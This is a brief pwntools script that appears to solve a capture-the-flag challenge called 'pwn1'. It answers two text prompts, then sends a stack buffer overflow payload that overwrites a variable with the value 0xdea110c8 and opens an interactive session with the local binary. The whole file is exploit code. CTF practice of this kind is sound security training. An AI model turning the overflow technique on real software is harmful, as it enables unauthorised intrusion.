from pwn import *
pwn1 = process('./pwn1')

payload = b"A"* (0x43 - 0x18) +  p32(0xdea110c8)
pwn1.send("Sir Lancelot of Camelot\n")
pwn1.send("To seek the Holy Grail.\n")
pwn1.sendline(payload)

pwn1.interactive()